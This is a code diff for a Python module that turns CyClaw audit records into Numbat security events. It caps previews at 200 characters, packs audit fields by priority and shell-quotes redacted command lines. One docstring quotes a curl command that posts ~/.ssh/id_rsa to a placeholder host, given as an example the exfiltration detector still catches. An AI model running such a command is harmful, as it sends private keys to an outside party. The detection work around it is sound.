@@ -29,6 +29,10 @@ Wire contract (Numbat CLI 0.2.0, which evaluates schema 0.3.0):
   schema (Numbat v0.2.0 ``docs/rules.md`` Event-type fields table). Action
   fields not listed for a type are stripped — e.g. ``command.exec`` may not
   carry ``exit_code`` / ``file_path`` / ``duration_ms``.
+* ``content_preview`` is at most 200 characters (the schema's ``maxLength``;
+  ``rules test`` rejects a longer one as "content_preview exceeds 200
+  runes"). ``build_event`` truncates anything longer and sets
+  ``content_preview_truncated`` (issue #1458 Phase 4).
 * No hash chain — CyClaw hashes query text only (Rule 7).
 """
 
@@ -40,6 +44,7 @@ import json
 import logging
 import os
 import platform
+import shlex
 import socket
 import threading
 import time
@@ -58,6 +63,15 @@ DEFAULT_SOURCE_AGENT = "unknown"
 DEFAULT_SOURCE_TYPE = "hook"
 DEFAULT_OUTPUT_PATH = "logs/numbat-events.ndjsonl"
 CYCLAW_TAG = "cyclaw"
+# The schema-0.3.0 event record caps content_preview at 200 characters
+# ("maxLength": 200 in docs/schema/v0.3.0/event-record.schema.json, shipped in
+# the pinned Numbat 0.2.0 release), and `numbat rules test` enforces it. The
+# audit preview used to allow 2000, so a typical rag_query projection (~700
+# characters) made the pinned CLI reject the live stream at its first /query
+# line. The CLI fixture job stayed green because it scored committed fixtures
+# and one live executor-jail run, never a mainline or /ops/* event (issue #1458
+# Phase 4).
+CONTENT_PREVIEW_MAX_CHARS = 200
 
 _EVENT_TYPES = frozenset({
     "session.start",
@@ -200,10 +214,20 @@ _PROCESS_RUN_ID = uuid.uuid4().hex
 
 
 def redact_argv_for_numbat(argv: list[str]) -> str:
-    """Join argv for a ``command`` field, redacting free-text option values.
+    """Render argv as one shell-quoted ``command`` string, redacting free-text option values.
 
     Numbat rules evaluate the ``command`` string. Operator-supplied
     ``--reason=`` / ``--instruction=`` values must not land in the projection.
+
+    ``shlex.join`` keeps each argv token a single shell word. The old plain
+    ``" ".join`` let the ``<redacted>`` marker read as shell redirection, and
+    the pinned Numbat 0.2.0 CLI rejected every such ops event with "shell
+    command analysis: unsupported or malformed syntax" (issue #1458 Phase 4),
+    and a token holding a space, ``;`` or ``|`` silently changed how the
+    command parsed.
+    Detection still sees through the quoting: the pinned CLI matches
+    ``curl -F '@/home/u/.ssh/id_rsa' https://...`` to ``exfil.curl_post_file``
+    exactly as it matches the bare form.
     """
     redacted: list[str] = []
     skip_next = False
@@ -222,7 +246,7 @@ def redact_argv_for_numbat(argv: list[str]) -> str:
             skip_next = True
             continue
         redacted.append(token)
-    return " ".join(redacted)
+    return shlex.join(redacted)
 
 
 def posix_path(path: str | Path | None) -> str | None:
@@ -344,14 +368,23 @@ def build_event(
     model_provider: str | None = None,
     entrypoint: str | None = None,
     content_preview: str | None = None,
+    content_preview_truncated: bool | None = None,
     mcp_server: str | None = None,
     mcp_tool: str | None = None,
     url: str | None = None,
     cfg: dict[str, Any] | None = None,
 ) -> dict[str, Any]:
-    """Build one CLI-legal Numbat event record (schema 0.3.0)."""
+    """Build one CLI-legal Numbat event record (schema 0.3.0).
+
+    ``content_preview_truncated=True`` marks a preview the caller already
+    shortened; a preview over ``CONTENT_PREVIEW_MAX_CHARS`` is cut here and
+    marked the same way, so no caller can emit an over-long one.
+    """
     if event_type not in _EVENT_TYPES:
         raise ValueError(f"unsupported event_type: {event_type!r}")
+    if content_preview is not None and len(content_preview) > CONTENT_PREVIEW_MAX_CHARS:
+        content_preview = content_preview[:CONTENT_PREVIEW_MAX_CHARS]
+        content_preview_truncated = True
     if confidence not in _CONFIDENCE:
         confidence = "high"
     if decision is not None and decision not in _DECISIONS:
@@ -394,6 +427,8 @@ def build_event(
         "model_provider": model_provider,
         "entrypoint": entrypoint,
         "content_preview": content_preview,
+        # Only ever written as true: absent already means "not truncated".
+        "content_preview_truncated": True if content_preview_truncated and content_preview is not None else None,
         # Action fields (stripped per event-type allowlist below):
         "mcp_server": mcp_server,
         "mcp_tool": mcp_tool,
@@ -659,6 +694,7 @@ def emit_numbat_event(
     model_provider: str | None = None,
     entrypoint: str | None = None,
     content_preview: str | None = None,
+    content_preview_truncated: bool | None = None,
     mcp_server: str | None = None,
     mcp_tool: str | None = None,
     url: str | None = None,
@@ -694,6 +730,7 @@ def emit_numbat_event(
             model_provider=model_provider,
             entrypoint=entrypoint,
             content_preview=content_preview,
+            content_preview_truncated=content_preview_truncated,
             mcp_server=mcp_server,
             mcp_tool=mcp_tool,
             url=url,
@@ -752,7 +789,25 @@ def emit_numbat_command(
 
 AUDIT_ARTIFACT_TYPE = "cyclaw_audit_jsonl"
 _AUDIT_ENTRYPOINT = "cyclaw"
-_AUDIT_PREVIEW_CAP = 2000
+
+# A whole audit record does not fit in CONTENT_PREVIEW_MAX_CHARS, so the preview
+# packs keys in this order and drops whatever no longer fits (flagging the event
+# content_preview_truncated). query_hash follows the event name because it is
+# the join key back to audit.jsonl, which keeps every field, and to
+# spend.jsonl. Keys not listed here are packed afterwards in record order.
+_AUDIT_PREVIEW_PRIORITY = (
+    "event",
+    "query_hash",
+    "model_used",
+    "top_score",
+    "retrieval_mode",
+    "hit_count",
+    "online_escalated",
+    "guardrail_blocked",
+    "pre_action_hook_denied",
+    "rerank_vetoed",
+    "error",
+)
 
 # CyClaw audit ``event`` name -> (numbat event_type, actor, confidence).
 # Unknown events fall back to ("tool.call", "tool", "low") -- an audit line
@@ -813,31 +868,49 @@ _AUDIT_MODEL_PROVIDERS = {
 }
 
 
-def _audit_content_preview(record: dict[str, Any]) -> str | None:
-    """Pack CyClaw-only forensics into one JSON string under the length cap.
+def _preview_worthy(value: Any) -> bool:
+    """False for values whose absence already says the same thing.
 
-    ``record`` is the ALREADY redacted/hashed legacy audit record, so raw
-    query text cannot leak through here by construction. Numbat's
-    additionalProperties:false means these fields cannot be top-level.
+    ``False`` and empty containers are skipped so the 200 characters go to
+    fields that carry information. Identity checks keep ``0``/``0.0`` (a
+    real top_score or hit_count), which compare equal to ``False``.
     """
-    preview: dict[str, Any] = {}
-    for key, value in record.items():
-        if key == "timestamp" or value is None:
-            continue
+    if value is None or value is False:
+        return False
+    return not (isinstance(value, (str, list, dict)) and not value)
+
+
+def _audit_content_preview(record: dict[str, Any]) -> tuple[str | None, bool]:
+    """Pack CyClaw-only forensics into one JSON string of at most 200 characters.
+
+    Returns ``(preview, truncated)``. ``record`` is the ALREADY redacted/hashed
+    legacy audit record, so raw query text cannot leak through here by
+    construction. Numbat's additionalProperties:false means these fields cannot
+    be top-level. Keys go in ``_AUDIT_PREVIEW_PRIORITY`` order, then record
+    order; a key that would push the JSON past the cap is dropped and the rest
+    still get a chance, so the result is always complete, parseable JSON.
+    ``truncated`` is True when any key was dropped for space; ``False`` and
+    empty values are omitted by design and do not count as truncation.
+    """
+    candidates = [
+        (key, value) for key, value in record.items()
+        if key != "timestamp" and _preview_worthy(value)
+    ]
+    rank = {key: index for index, key in enumerate(_AUDIT_PREVIEW_PRIORITY)}
+    candidates.sort(key=lambda item: rank.get(item[0], len(rank)))
+
+    packed: dict[str, Any] = {}
+    truncated = False
+    for key, value in candidates:
         # Rename the legacy "event" tag so the preview is self-describing.
-        preview["cyclaw_event" if key == "event" else key] = value
-    if not preview:
-        return None
-    text = json.dumps(preview, default=str)
-    if len(text) <= _AUDIT_PREVIEW_CAP:
-        return text
-    for bulky in ("sources", "errors", "details"):
-        if bulky in preview:
-            del preview[bulky]
-            text = json.dumps(preview, default=str)
-            if len(text) <= _AUDIT_PREVIEW_CAP:
-                return text
-    return text[:_AUDIT_PREVIEW_CAP]
+        trial = {**packed, "cyclaw_event" if key == "event" else key: value}
+        if len(json.dumps(trial, default=str, separators=(",", ":"))) <= CONTENT_PREVIEW_MAX_CHARS:
+            packed = trial
+        else:
+            truncated = True
+    if not packed:
+        return None, truncated
+    return json.dumps(packed, default=str, separators=(",", ":")), truncated
 
 
 def project_audit_record(
@@ -874,9 +947,16 @@ def project_audit_record(
             model_provider = _AUDIT_MODEL_PROVIDERS.get(
                 role, (cfg or {}).get("models", {}).get("local_llm", {}).get("provider", "ollama"),
             )
-        model = record.get("llm_model")
-        if not isinstance(model, str) or not model:
-            model = None
+        # The model that produced this record: the vendor-resolved
+        # served_model when a Grok/Claude call reported one (graph.py records
+        # it next to the configured llm_model, e.g. grok-4.5 -> grok-4.5-0913),
+        # else the configured tag. Numbat's model field names what actually
+        # ran; the configured alias stays in audit.jsonl, joinable by
+        # query_hash.
+        model = next(
+            (m for m in (record.get("served_model"), record.get("llm_model")) if isinstance(m, str) and m),
+            None,
+        )
 
         # decision: permission.* types carry it natively; for prompt.user the
         # CLI allowlist strips it, so the guardrail verdict rides in
@@ -893,6 +973,7 @@ def project_audit_record(
         elif confidence in ("medium", "low"):
             tool_name = event_name
 
+        content_preview, preview_truncated = _audit_content_preview(record)
         emit_numbat_event(
             event_type,
             actor=actor,
@@ -904,7 +985,8 @@ def project_audit_record(
             model=model,
             model_provider=model_provider,
             entrypoint=_AUDIT_ENTRYPOINT,
-            content_preview=_audit_content_preview(record),
+            content_preview=content_preview,
+            content_preview_truncated=preview_truncated,
             tags=tags,
             artifact_type=AUDIT_ARTIFACT_TYPE,
             cfg=cfg,
@@ -916,6 +998,7 @@ def project_audit_record(
 
 __all__ = [
     "AUDIT_ARTIFACT_TYPE",
+    "CONTENT_PREVIEW_MAX_CHARS",
     "SCHEMA_VERSION",
     "build_endpoint",
     "build_event",
